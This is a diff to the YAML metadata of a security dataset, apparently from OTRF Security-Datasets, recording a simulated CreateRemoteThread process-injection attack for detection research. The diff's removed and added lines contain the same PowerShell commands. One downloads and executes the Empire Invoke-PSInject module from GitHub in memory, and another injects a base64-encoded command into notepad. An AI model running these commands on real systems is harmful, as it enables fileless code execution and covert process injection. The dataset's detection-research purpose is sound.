@@ -33,15 +33,13 @@ datasets:
     link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190518-ProcessInjection-CreateRemoteThread/WORKSTATION6_Windows_Security.zip
 
 simulation:
-  environment: Blacksmith
-  tools:
-    - type: Manual
-      name: PowerShell
-      module: PowerShell
-      script: https://github.com/EmpireProject/Empire/blob/dev/data/module_source/management/Invoke-PSInject.ps1
-  permissions_required:
-    - Administrator
-  adversary_view: |-
-    PS C:\Users\wardog.MSSENTINEL> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-PSInject.ps1')
-    PS C:\Users\wardog.MSSENTINEL> notepad
-    PS C:\Users\wardog.MSSENTINEL> Invoke-PSInject -ProcName notepad -PoshCode 'SW52b2tlLUV4cHJlc3Npb24gd2hvYW1p'
+  executor: PowerShell
+  scriptUri: https://github.com/EmpireProject/Empire/blob/dev/data/module_source/management/Invoke-PSInject.ps1
+  supportingFileUris:
+  commands: |-
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-PSInject.ps1')
+    notepad.exe
+    Invoke-PSInject -ProcName notepad -PoshCode 'SW52b2tlLUV4cHJlc3Npb24gd2hvYW1p'
+  output: |-
+
+detection:
